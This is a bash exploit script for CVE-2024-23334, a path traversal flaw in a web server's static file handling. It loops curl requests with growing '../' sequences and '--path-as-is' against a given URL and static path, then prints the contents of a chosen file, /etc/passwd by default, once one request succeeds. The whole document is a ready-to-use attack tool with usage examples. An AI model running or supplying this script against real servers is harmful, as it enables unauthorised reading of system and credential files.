#!/bin/bash

# Colors for highlighting
GREEN="\033[0;32m"
RED="\033[0;31m"
RESET="\033[0m"

# Ensure arguments are provided
if [[ $# -lt 2 ]]; then
    echo -e "${RED}Usage: $0 <complete_url> <path> [file_to_exploit]${RESET}"
    echo -e "Example: $0 http://localhost:8081 static etc/passwd"
    echo -e "If no file is provided, /etc/passwd will be used by default."
    exit 1
fi

url="$1"
path="$2"
file="${3:-etc/passwd}"  # Default to etc/passwd if no third argument is given

# Check if URL ends with a slash and append if not
if [[ ! "$url" =~ /$ ]]; then
    url="$url/"
fi

# Check if path ends with a slash and append if not
if [[ ! "$path" =~ /$ ]]; then
    path="$path/"
fi

# Path traversal payload
string="../"
payload=""

echo -e "${GREEN}[+] Starting CVE-2024-23334 Exploit${RESET}"

# Iterate through payloads
for ((i=0; i<15; i++)); do
    payload+="$string"
    full_url="$url$path$payload$file"  # Combine the URL, path, payload, and file
    
    # Ensure there's no double slash between the path and the file
    full_url=$(echo "$full_url" | sed 's#//#/#g')  # Replace any occurrences of '//' with a single '/'

    echo "[+] Testing with $full_url"
    
    # Get the status code
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$full_url")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        echo -e "${GREEN}[+] Success! File found:${RESET}"
        curl -s --path-as-is "$full_url"
        break
    fi
done

if [[ $status_code -ne 200 ]]; then
    echo -e "${RED}[-] Exploit failed: Could not retrieve $file${RESET}"
fi
